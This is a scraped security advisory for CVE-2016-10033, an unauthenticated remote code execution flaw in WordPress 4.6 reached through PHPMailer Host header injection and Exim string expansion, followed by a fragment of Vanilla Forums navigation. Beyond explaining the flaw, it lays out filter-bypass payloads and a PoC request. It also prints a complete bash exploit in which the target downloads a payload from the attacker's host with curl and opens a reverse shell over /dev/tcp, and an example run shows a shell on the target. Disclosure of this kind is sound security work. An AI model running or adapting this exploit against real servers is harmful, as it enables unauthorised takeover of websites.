=== Content from exploitbox.io_703a9a92_20250126_112759.html ===


[Brand
![](../assets/img/logo.png)](../index.html)

* Stay Tuned

```

====================================================
- Discovered by: Dawid Golunski ([@dawid_golunski](https://twitter.com/dawid_golunski))
- dawid[at]legalhackers.com
- <https://legalhackers.com>
-
- [ExploitBox.io](https://ExploitBox.io) ([@Exploit_Box](https://twitter.com/Exploit_Box))

- CVE-2016-10033
- Release date: 03.05.2017
- Revision 2.0
- Last  update: 04.05.2017
- Severity: Critical
====================================================

I. VULNERABILITY
-------------------------

WordPress Core 4.6 - Unauthenticated Remote Code Execution (RCE) PoC Exploit
		     (default configuration, no plugins, no auth)

II. BACKGROUND
-------------------------

"WordPress is a free and open-source content management system
(CMS) based on PHP and MySQL.

WordPress was used by more than 27.5% of the top 10 million
websites as of February 2017. WordPress is reportedly the
most popular website management or blogging system in
use on the Web, supporting more than 60 million websites."

<https://en.wikipedia.org/wiki/WordPress>

III. INTRODUCTION
-------------------------

This advisory reveals details of exploitation of the PHPMailer
vulnerability (CVE-2016-10033) in WordPress Core which (contrary to what
was believed and announced by WordPress security team) was affected by the
vulnerability.

The Remote Code Execution attack could be used by unauthenticated remote attackers
to gain instant access to the target server on which a vulnerable WordPress
core version was installed in its default configuration which could lead
to a full compromise of the target application server.
No plugins or non-standard settings are required to exploit the vulnerability.

This advisory reveals new exploitation vectors for PHP mail()
function discovered by the author that allow to exploit the vulnerability on a
most popular MTA (Mail Transfer Agent) - Exim which can be found installed by
default on many system such as Debian or Ubuntu, as opposed to rarely used
Sendmail MTA that has been thought to be a requirement for mail() injection
attacks to date.

Due to critical severity of this vulnerability, disclosure of new
exploitation vectors that increase the range of this type of attacks, and the ease
of mass exploitation, the release of this advisory was delayed by an
extended period of time to allow WordPress and other potentially affected
software vendors enough time to update affected mail libraries.

IV. DESCRIPTION
-------------------------

The following snippet of code from WordPress 4.6 - file wp-includes/pluggable.php:

      if ( !isset( $from_email ) ) {
              // Get the site domain and get rid of www.
              $sitename = strtolower( $_SERVER['SERVER_NAME'] );
              if ( substr( $sitename, 0, 4 ) == 'www.' ) {
                      $sitename = substr( $sitename, 4 );
              }

              $from_email = 'wordpress@' . $sitename;
      }

      /**
       * Filters the name to associate with the "from" email address.
       *
       * @since 2.3.0
       *
       * @param string $from_name Name associated with the "from" email address.
       */
      $from_name = apply_filters( 'wp_mail_from_name', $from_name );

      $phpmailer->setFrom( $from_email, $from_name );

shows that WordPress sets the email domain based on SERVER_NAME server
header when WordPress wp_mail() function is called to send an email (e.g. upon
user registration, forgotten password etc.).

As we can see the from address is formed as follows:

$from_email = 'wordpress@' . $sitename;

It is then filtered and passed to a vulnerable setFrom() function of PHPMailer which
was explained in detail in the previous advisories:

<https://legalhackers.com/advisories/PHPMailer-Exploit-Remote-Code-Exec-CVE-2016-10045-Vuln-Patch-Bypass.html>
<https://legalhackers.com/advisories/PHPMailer-Exploit-Remote-Code-Exec-CVE-2016-10033-Vuln.html>

Injection
==============

SERVER_NAME server header can be manipulated on default configurations of Apache
Web server (most common WordPress deployment) via HOST header of a HTTP request.

To illustrate, here is a request and response of a simple php script vars.php that
simply prints out relevant parts of server headers ($_SERVER PHP array):

GET /vars.php HTTP/1.1
Host: xenialINJECTION

HTTP/1.1 200 OK
Server: Apache

Array
(
  [HTTP_HOST] => xenialINJECTION
  [SERVER_SOFTWARE] => Apache/2.4.18 (Ubuntu)
  [SERVER_NAME] => xenialinjection
...

As we can see, INJECTION string appended to the hostname in HOST header gets
copied to both HTTP_HOST and SERVER_NAME  PHP variables.

Using this HOST header example, if an attacker triggered wp_mail() function
by using the forgotten password WordPress feature, the HTTP request would be similar to:

POST /wordpress/wp-login.php?action=lostpassword HTTP/1.1
Host: xenialINJECT
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Content-Type: application/x-www-form-urlencoded
Content-Length: 56
Cookie: wordpress_test_cookie=WP+Cookie+check
Connection: close

user_login=admin&redirect_to=&wp-submit=Get+New+Password

and would result in the following parameters passed to /usr/sbin/sendmail :

Arg no. 0 == [/usr/sbin/sendmail]
Arg no. 1 == [-t]
Arg no. 2 == [-i]
Arg no. 3 == [-fwordpress@xenialinject]

What is interesting here is the 3rd parameter. The domain part of the email
matches the HOST header of the request, except for lower-case "inject".

Bypassing the filters
=======================

To exploit the PHPMailer's mail() injection vulnerability, an attacker would
have to be able to append parameters to the domain part.
However, the filtration/validation in
place (both on the wordpress side as well as PHPMailer library side) would
prevent the attacker from injecting white-characters (such as space
or TAB) and therefore from injecting parameters to sendmail binary.

For example, if attacker modified the HOST header to the following:

POST /wordpress/wp-login.php?action=lostpassword HTTP/1.1
Host: xenialINJECT SPACE

the validation would result in invalid domain part error and WordPress
application would exit with http response of:

HTTP/1.0 500 Internal Server Error

In which case wp_mail() and therefore the vulnerable PHPMailer
functions would never be reached (sendmail binary would not be executed).

The validateAddress() function of PHPMailer library as well as PHP's
filter_var/FILTER_VALIDATE_EMAIL are both complient with RFC 822 standard
as we can read at:

<http://php.net/manual/en/filter.filters.validate.php>

which prohibits spaces in the domain part and thus prevents injection
of additional parameters to /usr/sbin/sendmail.

It should be noted that the technique of injecting additional \ backslash
characters to the username part of the email presented in PHPMailer advisory:
<http://legalhackers.com/advisories/PHPMailer-Exploit-Remote-Code-Exec-CVE-2016-10033-Vuln.html>

would not be an option for the attacker as username part of the from
address cannot be controlled in this case.

RFC 822 and comment syntax
--------------

Looking at the RFC 822 specs however, a potential way to bypass the validation
was found. According to:
<https://www.ietf.org/rfc/rfc822.txt>

email addresses can contain comments:

"
3.4.3.  COMMENTS

      A comment is a set of ASCII characters, which is  enclosed  in
      matching  parentheses  and which is not within a quoted-string
      The comment construct permits message originators to add  text
      which  will  be  useful  for  human readers, but which will be
      ignored by the formal semantics.  Comments should be  retained
      while  the  message  is subject to interpretation according to
      this standard.  However, comments  must  NOT  be  included  in
      other  cases,  such  as  during  protocol  exchanges with mail
      servers.
"

The document gives an email example of with comments in brackets:

":sysmail"@  Some-Group. Some-Org,
          Muhammed.(I am  the greatest) Ali @(the)Vegas.WBA

as a valid email.

A simplified comment example within the domain part would be:

john@example.com(comment)

After further testing, it turned out that comment part can contain spaces
in the domain part, and could be used as a way to bypass the
validation of the domain part and inject additional parameters to
sendmail binary.

Injecting parameters via comment syntax
----------------

The following request with the HOST header set to:

POST /wordpress/wp-login.php?action=lostpassword HTTP/1.1
Host: xenial(tmp1 injected tmp2)

will not cause errors and will result in the following parameters supplied to
sendmail :

Arg no. 0 == [/usr/sbin/sendmail]
Arg no. 1 == [-t]
Arg no. 2 == [-i]
Arg no. 3 == [-fwordpress@xenial(tmp1]
Arg no. 4 == [injected]
Arg no. 5 == [tmp2)]

As we can see, We have managed to bypass filters/validation provided by

Wordpress filter:

apply_filters( 'wp_mail_from_name', $from_name );

As well as PHPMailer's internal setFrom() validation.

We now have control over the 4th parameter ('injected') and can inject
more parameters inbeetwen arg no.3 and no.5 if necessary.

In theory we should now be able to inject additional parameters to
/usr/sbin/sendmail wrapper to achieve arbitrary code execution.

Code Execution via Sendmail MTA
=================================

To date, the only known way of achieving remote code execution via
PHP mail() exploitation relied on Sendmail MTA being present on the
target system.

The most common Sendmail MTA vector is similar to:

-OQueueDirectory=/tmp/ -X/var/www/html/backdoor.php

It typically writes out a log file with a php backdoor contained within the
input message.

There are 2 problems with this technique however:

1)
Sendmail MTA is not commonly used anymore as we can verify by looking
at the statistics at:

<http://www.securityspace.com/s_survey/data/man.201703/mxsurvey.html>

which show that Sendmail is the least popular among Linux MTAs.

It does not ship with any modern Linux distribution and it is not
very likely for it to be found installed on a target.

2)
The Sendmail technique presented above would not work in the case
of the WordPress vulnerability discussed in this advisory.
As previously mentioned, hostname copied to SERVER_NAME server
variable gets converted into lower-case and therefore injecting
Sendmail parameters in a request similar to:

POST /wordpress/wp-login.php?action=lostpassword HTTP/1.1
Host: xenial(tmp1 -O -X tmp2)

would result in the follwing set of sendmail arguments:

Arg no. 0 == [/usr/sbin/sendmail]
Arg no. 1 == [-t]
Arg no. 2 == [-i]
Arg no. 3 == [-fwordpress@xenial(tmp1]
Arg no. 4 == [-o]
Arg no. 5 == [-x]
Arg no. 6 == [tmp2)]

Sendmail would fail with an error as arguments are case-sensitive
and neither -q nor -x would work.

Code execution via Exim4 MTA
=================================

While researching the other vulnerabilities in email sending
libraries (see previously published advisories for PHPMailer, ZendMail,
Swiftmailer), the author of this advisory discovered a new way to
achieve command execution with the help of Exim MTA that was
previously thought to be immune to mail() injection attacks.

This technique has been documented in the white-paper :
["Pwning PHP mail() function For Fun And Remote Code Execution"](https://exploitbox.io/paper/Pwning-PHP-Mail-Function-For-Fun-And-RCE.html)

The ability to execute commands through Exim4 MTA opens up many
possibilities in regards to exploitation not only of already disclosed
vulnerabilities in PHPMailer and other email libraries, but also in
regards to mail() function exploitation in general as Exim4 is the
most popular MTA available by default on popular Linux distributions
such as Debian.

The survey confirms the popularity of exim:
<http://www.securityspace.com/s_survey/data/man.201703/mxsurvey.html>

This increases the chances of it being present on the remote target
and is ideal for a reliable proof of concept exploit of the vulnerability
presented in this advisory.

Direct code execution with Exim4 MTA
--------------------------------

The discovered Exim MTA vector, in its most basic form works
in the following way:

sendmail -be '${run{/bin/true}{true}{false}}'
true

The -be switch enables string expansion testing mode.
The above expansion executes /bin/true and returns the value from
the brackets based on the exit code.

Similarly, the expansion:
sendmail -be '${run{/bin/bash -c "id"}{yes}{no}}'

would execute id command.

Note: on systems with Exim4, /usr/sbin/sendmail is just a symlink:
/usr/sbin/sendmail -> exim4
and has nothing to do with Sendmail MTA.
Sendmail MTA is not required to be present on the system for the
technique to work.

What is very powerful about this vector is that command
execution can be achieved in a reliable way directly through the
$run expansion specified as an argument and does not require
writing files to /var/www/html or guessing directory paths
which is the case in already known Sendmail MTA vector.

HOST header restrictions
----------------------------------

The seemingly simple Exim4 vector turned out to be tricky in practice
since the presented above expansion string would not work within HOST header.

A HTTP request similar to:

POST /wordpress/wp-login.php?action=lostpassword HTTP/1.1
Host: xenial(tmp1 slash/ -X tmp2)

would be rejected by Apache webserver due to / (slash) character
present within the HOST header.
The $run function would not
work without it as it requires  a full path to the binary that is being
executed (suggesting that exim4 uses exec() to run it and does
not execute commands through system() ).

Bypassing restrictions
==============================

To bypass restriction of the HOST header several methods
were attempted by studying available Exim expansion strings at:

<http://www.exim.org/exim-html-current/doc/html/spec_html/ch-string_expansions.html>

Embeded perl
----------------------

One of the expansions that was considered was:
${perl{foo}{argument1}{argument2} ... }

however perl is not enabled by default on Exim and therefore
would not make the exploit reliable.

Encoding
---------------------

The family of base64 and HEX encoding/decoding functions were tested
but they did not seem to be supported by exim4 used for testing and
would result in errors such as:

sendmail -be '${base64d:QUI=}'
Failed: unknown expansion operator "base64d"

Substrings & Environment variables
---------------------

Another idea was to use known environment variables in combination
with substrings to extract forbidden slash character.

For example, the PATH environment variable contains slash:

PATH=/bin:/usr/bin

and therefore was a good candidate.

${env{PATH}} could be used to retrieve the variable and when
connected with $substring expansion, slash could be obtained
as can be seen in the following command:

sendmail -be '${substr{0}{1}{${env{PATH}}}}'
/

Unfortunately, this technique led to a dead-end as environment
variables such as PATH when inserted within HOST header would
be converted to lower-case and thus not work under Linux.

Substrings & internal exim4 variables
--------------------------------------

With trial and error, the following variable was found to work
as expected:

sendmail -be '${spool_directory}'
/var/spool/exim4

The spool_directory variable is present by default, and does
not have capital letters  and therefore would work reliably.

The slash character could now be replaced with:

${substr{0}{1}{$spool_directory}}

to bypass the slash restriction of the HOST header.

The following expansion:

sendmail -be '${run{/usr/bin/touch /tmp/test}}'

Could now be converted to:

sendmail -be '${run{${substr{0}{1}{$spool_directory}}usr${substr{0}{1}{$spool_directory}}bin${substr{0}{1}{$spool_directory}}touch ${substr{0}{1}{$spool_directory}}tmp${substr{0}{1}{$spool_directory}}test}}'

This worked fine under terminal however when tested within a HTTP request:

POST /wordpress/wp-login.php?action=lostpassword HTTP/1.1
Host: xenial(tmp1 -be ${run{${substr{0}{1}{$spool_directory}}usr${substr{0}{1}{$spool_directory}}bin${substr{0}{1}{$spool_directory}}touch ${substr{0}{1}{$spool_directory}}tmp${substr{0}{1}{$spool_directory}}test}}  tmp2)

it would result in the following sendmail parameters:

Arg no. 0 == [/usr/sbin/sendmail]
Arg no. 1 == [-t]
Arg no. 2 == [-i]
Arg no. 3 == [-fwordpress@xenial(tmp1]
Arg no. 4 == [-be]
Arg no. 5 == [${run{${substr{0}{1}{$spool_directory}}usr${substr{0}{1}{$spool_directory}}bin${substr{0}{1}{$spool_directory}}touch]
Arg no. 6 == [${substr{0}{1}{$spool_directory}}tmp${substr{0}{1}{$spool_directory}}test}}]
Arg no. 7 == [tmp2)]

As we can see, the expansion payload got broken into 2 arguments 5 & 6
instead of one.
This prevented Exim from executing the payload properly.

The problem was caused by spaces between command parameters (e.g. space after
'touch')

Replacing spaces
------------------

First the environment variable IFS was considered, however
environment variables would not work properly as previously tested.

After further research a convenient internal exim variable was found:

sendmail -be '${tod_log}'
2016-01-02 23:49:42

the tod_log variable returns current date in format that contains a space.

Similar to the slash replacement, $substring + $tod_log variable could
be used to replace the space as was tested with:

sendmail -be '${substr{10}{1}{$tod_log}}'

PoC HTTP request / minimal PoC exploit
====================================

POST /wordpress/wp-login.php?action=lostpassword HTTP/1.1
Host: xenial(tmp1 -be ${run{${substr{0}{1}{$spool_directory}}usr${substr{0}{1}{$spool_directory}}bin${substr{0}{1}{$spool_directory}}touch${substr{10}{1}{$tod_log}}${substr{0}{1}{$spool_directory}}tmp${substr{0}{1}{$spool_directory}}test}}  tmp2)
Content-Type: application/x-www-form-urlencoded
Content-Length: 56

user_login=admin&redirect_to=&wp-submit=Get+New+Password

The above request when sent to WordPress core application would cause exim
to be called with the following arguments:

Arg no. 0 == [/usr/sbin/sendmail]
Arg no. 1 == [-t]
Arg no. 2 == [-i]
Arg no. 3 == [-fwordpress@xenial(tmp1]
Arg no. 4 == [-be]
Arg no. 5 == [${run{${substr{0}{1}{$spool_directory}}usr${substr{0}{1}{$spool_directory}}bin${substr{0}{1}{$spool_directory}}touch${substr{10}{1}{$tod_log}}${substr{0}{1}{$spool_directory}}tmp${substr{0}{1}{$spool_directory}}test}}]
Arg no. 6 == [tmp2)]

which would execute:
/usr/bin/touch /tmp/test

on the target and create a file /tmp/test as tested on WordPress 4.6.

Using this payload logic a working exploit was built which executes
a reverse shell on the target.

V. PROOF OF CONCEPT EXPLOIT CODE
-------------------------

#!/bin/bash
#
#      __                     __   __  __           __
#     / /   ___  ____ _____ _/ /  / / / /___ ______/ /_____  __________
#    / /   / _ \/ __ `/ __ `/ /  / /_/ / __ `/ ___/ //_/ _ \/ ___/ ___/
#   / /___/  __/ /_/ / /_/ / /  / __  / /_/ / /__/ ,< /  __/ /  (__  )
#  /_____/\___/\__, /\__,_/_/  /_/ /_/\__,_/\___/_/|_|\___/_/  /____/
#            /____/
#
#
# WordPress 4.6 - Remote Code Execution (RCE) PoC Exploit
# CVE-2016-10033
#
# wordpress-rce-exploit.sh (ver. 1.0)
#
#
# Discovered and coded by
#
# Dawid Golunski (@dawid_golunski)
# https://legalhackers.com
#
# ExploitBox project:
# https://ExploitBox.io
#
# Full advisory URL:
# https://exploitbox.io/vuln/WordPress-Exploit-4-6-RCE-CODE-EXEC-CVE-2016-10033.html
#
# Exploit src URL:
# https://exploitbox.io/exploit/wordpress-rce-exploit.sh
#
#
# Tested on WordPress 4.6:
# https://github.com/WordPress/WordPress/archive/4.6.zip
#
# Usage:
# ./wordpress-rce-exploit.sh target-wordpress-url
#
#
# Disclaimer:
# For testing purposes only
#
#
# -----------------------------------------------------------------
#
# Interested in vulns/exploitation?
#
#
#                        .;lc'
#                    .,cdkkOOOko;.
#                 .,lxxkkkkOOOO000Ol'
#             .':oxxxxxkkkkOOOO0000KK0x:'
#          .;ldxxxxxxxxkxl,.'lk0000KKKXXXKd;.
#       ':oxxxxxxxxxxo;.       .:oOKKKXXXNNNNOl.
#      '';ldxxxxxdc,.              ,oOXXXNNNXd;,.
#     .ddc;,,:c;.         ,c:         .cxxc:;:ox:
#     .dxxxxo,     .,   ,kMMM0:.  .,     .lxxxxx:
#     .dxxxxxc     lW. oMMMMMMMK  d0     .xxxxxx:
#     .dxxxxxc     .0k.,KWMMMWNo :X:     .xxxxxx:
#     .dxxxxxc      .xN0xxxxxxxkXK,      .xxxxxx:
#     .dxxxxxc    lddOMMMMWd0MMMMKddd.   .xxxxxx:
#     .dxxxxxc      .cNMMMN.oMMMMx'      .xxxxxx:
#     .dxxxxxc     lKo;dNMN.oMM0;:Ok.    'xxxxxx:
#     .dxxxxxc    ;Mc   .lx.:o,    Kl    'xxxxxx:
#     .dxxxxxdl;. .,               .. .;cdxxxxxx:
#     .dxxxxxxxxxdc,.              'cdkkxxxxxxxx:
#      .':oxxxxxxxxxdl;.       .;lxkkkkkxxxxdc,.
#          .;ldxxxxxxxxxdc, .cxkkkkkkkkkxd:.
#             .':oxxxxxxxxx.ckkkkkkkkxl,.
#                 .,cdxxxxx.ckkkkkxc.
#                    .':odx.ckxl,.
#                        .,.'.
#
# <https://ExploitBox.io>
#
# <https://twitter.com/Exploit_Box>
#
# -----------------------------------------------------------------

rev_host="192.168.57.1"

function prep_host_header() {
      cmd="$1"
      rce_cmd="\${run{$cmd}}";

      # replace / with ${substr{0}{1}{$spool_directory}}
      #sed 's^/^${substr{0}{1}{$spool_directory}}^g'
      rce_cmd="`echo $rce_cmd | sed 's^/^\${substr{0}{1}{\$spool_directory}}^g'`"

      # replace ' ' (space) with
      #sed 's^ ^${substr{10}{1}{$tod_log}}$^g'
      rce_cmd="`echo $rce_cmd | sed 's^ ^\${substr{10}{1}{\$tod_log}}^g'`"
      #return "target(any -froot@localhost -be $rce_cmd null)"
      host_header="target(any -froot@localhost -be $rce_cmd null)"
      return 0
}

#cat exploitbox.ans
intro="
DQobWzBtIBtbMjFDG1sxOzM0bSAgICAuO2xjJw0KG1swbSAbWzIxQxtbMTszNG0uLGNka2tPT09r
bzsuDQobWzBtICAgX19fX19fXxtbOEMbWzE7MzRtLiwgG1swbV9fX19fX19fG1s1Q19fX19fX19f
G1s2Q19fX19fX18NCiAgIFwgIF9fXy9fIF9fX18gG1sxOzM0bScbWzBtX19fXBtbNkMvX19fX19c
G1s2Q19fX19fX19cXyAgIF8vXw0KICAgLyAgXy8gICBcXCAgIFwvICAgLyAgIF9fLxtbNUMvLyAg
IHwgIFxfX19fXy8vG1s3Q1wNCiAgL19fX19fX19fXz4+G1s2QzwgX18vICAvICAgIC8tXCBfX19f
IC8bWzVDXCBfX19fX19fLw0KIBtbMTFDPF9fXy9cX19fPiAgICAvX19fX19fX18vICAgIC9fX19f
X19fPg0KIBtbNkMbWzE7MzRtLmRkYzssLDpjOy4bWzlDG1swbSxjOhtbOUMbWzM0bS5jeHhjOjs6
b3g6DQobWzM3bSAbWzZDG1sxOzM0bS5keHh4eG8sG1s1QxtbMG0uLCAgICxrTU1NMDouICAuLBtb
NUMbWzM0bS5seHh4eHg6DQobWzM3bSAbWzZDG1sxOzM0bS5keHh4eHhjG1s1QxtbMG1sVy4gb01N
TU1NTU1LICBkMBtbNUMbWzM0bS54eHh4eHg6DQobWzM3bSAbWzZDG1sxOzM0bS5keHh4eHhjG1s1
QxtbMG0uMGsuLEtXTU1NV05vIDpYOhtbNUMbWzM0bS54eHh4eHg6DQobWzM3bSAbWzZDLhtbMTsz
NG1keHh4eHhjG1s2QxtbMG0ueE4weHh4eHh4eGtYSywbWzZDG1szNG0ueHh4eHh4Og0KG1szN20g
G1s2Qy4bWzE7MzRtZHh4eHh4YyAgICAbWzBtbGRkT01NTU1XZDBNTU1NS2RkZC4gICAbWzM0bS54
eHh4eHg6DQobWzM3bSAbWzZDG1sxOzM0bS5keHh4eHhjG1s2QxtbMG0uY05NTU1OLm9NTU1NeCcb
WzZDG1szNG0ueHh4eHh4Og0KG1szN20gG1s2QxtbMTszNG0uZHh4eHh4YxtbNUMbWzBtbEtvO2RO
TU4ub01NMDs6T2suICAgIBtbMzRtJ3h4eHh4eDoNChtbMzdtIBtbNkMbWzE7MzRtLmR4eHh4eGMg
ICAgG1swbTtNYyAgIC5seC46bywgICAgS2wgICAgG1szNG0neHh4eHh4Og0KG1szN20gG1s2Qxtb
MTszNG0uZHh4eHh4ZGw7LiAuLBtbMTVDG1swOzM0bS4uIC47Y2R4eHh4eHg6DQobWzM3bSAbWzZD
G1sxOzM0bS5keHh4eCAbWzBtX19fX19fX18bWzEwQ19fX18gIF9fX19fIBtbMzRteHh4eHg6DQob
WzM3bSAbWzdDG1sxOzM0bS4nOm94IBtbMG1cG1s2Qy9fIF9fX19fX19fXCAgIFwvICAgIC8gG1sz
NG14eGMsLg0KG1szN20gG1sxMUMbWzE7MzRtLiAbWzBtLxtbNUMvICBcXBtbOEM+G1s3QzwgIBtb
MzRteCwNChtbMzdtIBtbMTJDLxtbMTBDLyAgIHwgICAvICAgL1wgICAgXA0KIBtbMTJDXF9fX19f
X19fXzxfX19fX19fPF9fX18+IFxfX19fPg0KIBtbMjFDG1sxOzM0bS4nOm9keC4bWzA7MzRtY2t4
bCwuDQobWzM3bSAbWzI1QxtbMTszNG0uLC4bWzA7MzRtJy4NChtbMzdtIA0K"
intro2="
ICAgICAgICAgICAgICAgICAgIBtbNDRtfCBFeHBsb2l0Qm94LmlvIHwbWzBtCgobWzk0bSsgLS09
fBtbMG0gG1s5MW1Xb3JkcHJlc3MgQ29yZSAtIFVuYXV0aGVudGljYXRlZCBSQ0UgRXhwbG9pdBtb
MG0gIBtbOTRtfBtbMG0KG1s5NG0rIC0tPXwbWzBtICAgICAgICAgICAgICAgICAgICAgICAgICAg
ICAgICAgICAgICAgICAgICAgICAbWzk0bXwbWzBtChtbOTRtKyAtLT18G1swbSAgICAgICAgICBE
aXNjb3ZlcmVkICYgQ29kZWQgQnkgICAgICAgICAgICAgICAgG1s5NG18G1swbQobWzk0bSsgLS09
fBtbMG0gICAgICAgICAgICAgICAbWzk0bURhd2lkIEdvbHVuc2tpG1swbSAgICAgICAgICAgICAg
ICAgIBtbOTRtfBtbMG0gChtbOTRtKyAtLT18G1swbSAgICAgICAgIBtbOTRtaHR0cHM6Ly9sZWdh
bGhhY2tlcnMuY29tG1swbSAgICAgICAgICAgICAgG1s5NG18G1swbSAKG1s5NG0rIC0tPXwbWzBt
ICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAbWzk0bXwbWzBt
ChtbOTRtKyAtLT18G1swbSAiV2l0aCBHcmVhdCBQb3dlciBDb21lcyBHcmVhdCBSZXNwb25zaWJp
bGl0eSIgG1s5NG18G1swbSAKG1s5NG0rIC0tPXwbWzBtICAgICAgICAqIEZvciB0ZXN0aW5nIHB1
cnBvc2VzIG9ubHkgKiAgICAgICAgICAbWzk0bXwbWzBtIAoKCg=="
echo "$intro"  | base64 -d
echo "$intro2" | base64 -d

if [ "$#" -ne 1 ]; then
echo -e "Usage:\n$0 target-wordpress-url\n"
exit 1
fi
target="$1"
echo -ne "\e[91m[*]\033[0m"
read -p " Sure you want to get a shell on the target '$target' ? [y/N] " choice
echo

if [ "$choice" == "y" ]; then

echo -e "\e[92m[*]\033[0m Guess I can't argue with that... Let's get started...\n"
echo -e "\e[92m[+]\033[0m Connected to the target"

# Serve payload/bash script on :80
RCE_exec_cmd="(sleep 3s && nohup bash -i >/dev/tcp/$rev_host/1337 0<&1 2>&1) &"
echo "$RCE_exec_cmd" > rce.txt
python -mSimpleHTTPServer 80 2>/dev/null >&2 &
hpid=$!

# Save payload on the target in /tmp/rce
cmd="/usr/bin/curl -o/tmp/rce $rev_host/rce.txt"
prep_host_header "$cmd"
curl -H"Host: $host_header" -s -d 'user_login=admin&wp-submit=Get+New+Password' $target/wp-login.php?action=lostpassword
echo -e "\n\e[92m[+]\e[0m Payload sent successfully"

# Execute payload (RCE_exec_cmd) on the target /bin/bash /tmp/rce
cmd="/bin/bash /tmp/rce"
prep_host_header "$cmd"
curl -H"Host: $host_header" -d 'user_login=admin&wp-submit=Get+New+Password' $target/wp-login.php?action=lostpassword &
echo -e "\n\e[92m[+]\033[0m Payload executed!"

echo -e "\n\e[92m[*]\033[0m Waiting for the target to send us a \e[94mreverse shell\e[0m...\n"
nc -vv -l 1337
echo
else
echo -e "\e[92m[+]\033[0m Responsible choice ;) Exiting.\n"
exit 0

fi

echo "Exiting..."
exit 0

Video PoC
~~~~~~~~~~~~

Example run
~~~~~~~~~~~~~~~

# ./wordpress-rce-exploit.sh <http://wp-host/wordpress/>

                        .;lc'
                    .,cdkkOOOko;.
 _______        ., ________     ________      _______
 \  ___/_ ____ '___\      /_____\      _______\_   _/_
 /  _/   \\   \/   /   __/     //   |  \_____//       \
/_________>>      < __/  /    /-\ ____ /     \ _______/
          <___/\___>    /________/    /_______>
     .ddc;,,:c;.         ,c:         .cxxc:;:ox:
     .dxxxxo,     .,   ,kMMM0:.  .,     .lxxxxx:
     .dxxxxxc     lW. oMMMMMMMK  d0     .xxxxxx:
     .dxxxxxc     .0k.,KWMMMWNo :X:     .xxxxxx:
     .dxxxxxc      .xN0xxxxxxxkXK,      .xxxxxx:
     .dxxxxxc    lddOMMMMWd0MMMMKddd.   .xxxxxx:
     .dxxxxxc      .cNMMMN.oMMMMx'      .xxxxxx:
     .dxxxxxc     lKo;dNMN.oMM0;:Ok.    'xxxxxx:
     .dxxxxxc    ;Mc   .lx.:o,    Kl    'xxxxxx:
     .dxxxxxdl;. .,               .. .;cdxxxxxx:
     .dxxxx ________          ____  _____ xxxxx:
      .':ox \      /_ ________\   \/    / xxc,.
          . /     /  \\        >       <  x,
           /          /   |   /   /\    \
           \_________<_______<____> \____>
                    .':odx.ckxl,.
                        .,.'.

                 | ExploitBox.io |

+ --=| Wordpress Core - Unauthenticated RCE Exploit  |
+ --=|                                               |
+ --=|          Discovered & Coded By                |
+ --=|               Dawid Golunski                  |
+ --=|         <https://legalhackers.com>              |
+ --=|                                               |
+ --=| "With Great Power Comes Great Responsibility" |
+ --=|        * For testing purposes only *          |

[*] Sure you want to get a shell on the target '[http://wp-host/wordpress/'](http://wp-host/wordpress/%27) ? [y/N] y

[*] Guess I can't argue with that... Let's get started...

[+] Connected to the target

[+] Payload sent successfully

[+] Payload executed!

[*] Waiting for the target to send us a reverse shell...

Listening on [0.0.0.0] (family 0, port 1337)
Connection from [192.168.57.3] port 1337 [tcp/*] accepted (family 2, sport 39232)
bash: cannot set terminal process group (10408): Inappropriate ioctl for device
bash: no job control in this shell
www-data@xenial:/$ id
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
www-data@xenial:/$ exit
exit
exit

Exiting...

VI. BUSINESS IMPACT
-------------------------

Upon a successfull exploitation, a remote unauthenticated attacker
would be able to execute arbitrary code on the target server and compromise
the target application.

VII. SYSTEMS AFFECTED
-------------------------

The Remote Code Execution PoC exploit described in this advisory is based
on version 4.6 although other versions of WordPress (prior to 4.7.1 which
fixed the PHPMailer vulnerability) might also be affected.

The advisory presents the exploitation on the example of Exim MTA,
the author has also developed another exploit that can also be used on
other MTA software. The exploit will be shared shortly after this advisory.

VIII. SOLUTION
-------------------------

Update to the latest version of WordPress.

IX. REFERENCES
-------------------------

<https://legalhackers.com>

<https://ExploitBox.io>

Vulnerable WordPress version used for testing/exploitation:
<https://github.com/WordPress/WordPress/archive/4.6.zip>

Exploit code:
[WordPress Core 4.6 - Unauth Remote Code Execution PoC Exploit](https://ExploitBox.io/exploit/wordpress-rce-exploit.sh)

Video PoC:
<https://www.youtube.com/watch?v=ZFt_S5pQPX0>

WordPress security team announcement regarding phpmailer:
<https://wordpress.org/news/2017/01/wordpress-4-7-1-security-and-maintenance-release/>

WordPress security team response to phpmailer
https://core.trac.wordpress.org/ticket/37210#trac-change-14-1482913077988770

Vendor site:
<https://wordpress.org>

Related advisories:

<https://legalhackers.com/advisories/PHPMailer-Exploit-Remote-Code-Exec-CVE-2016-10045-Vuln-Patch-Bypass.html>

<https://legalhackers.com/advisories/PHPMailer-Exploit-Remote-Code-Exec-CVE-2016-10033-Vuln.html>

<https://legalhackers.com/advisories/SwiftMailer-Exploit-Remote-Code-Exec-CVE-2016-10074-Vuln.html>

X. CREDITS
-------------------------

The vulnerabilities and exim mail() injection vector presented in this advisory
were discovered by :

Dawid Golunski
dawid (at) legalhackers (dot) com

<https://legalhackers.com>
[ExploitBox.io](https://ExploitBox.io) ([@Exploit_Box](https://twitter.com/Exploit_Box))

XI. REVISION HISTORY
-------------------------

03.05.2017 - Advisory released, rev. 1

04.05.2017 - Revision 2. Updated introduction to help separate different issues.

XII. EXPLOITBOX - A PLAYGROUND FOR HACKERS
-------------------------

ExploitBox.io is coming soon.
Subscribe at <https://ExploitBox.io> to stay updated and be there for the launch.

XIII. LEGAL NOTICES
-------------------------

The information contained within this advisory is supplied "as-is" with
no warranties or guarantees of fitness of use or otherwise. I accept no
responsibility for any damage caused by the use or misuse of this information.

```

[![](../assets/img/logo.png)](https://ExploitBox.io)

**COMING SOON** **█**



=== Content from open.vanillaforums.com_22526aa4_20250125_194658.html ===


[![Vanilla Forums](https://us.v-cdn.net/5018160/uploads/fb3af9601a44d13eb2b42f9e02fe924b.png)](/)

[Blog](https://vanilla.higherlogic.com/blog/)
[Documentation](https://docs.vanillaforums.com)
[Book a Demo](https://www.higherlogic.com/vanilla-demo-request/)

toggle menu

[Categories](/categories)

[Discussions](/discussions)

[Activity](/activity)

[Best Of...](/bestof/everything)

[![Vanilla Forums](https://us.v-cdn.net/5018160/uploads/e13bbf06962e8f4b2aa2eb2b0b0edbc7.png)](/)
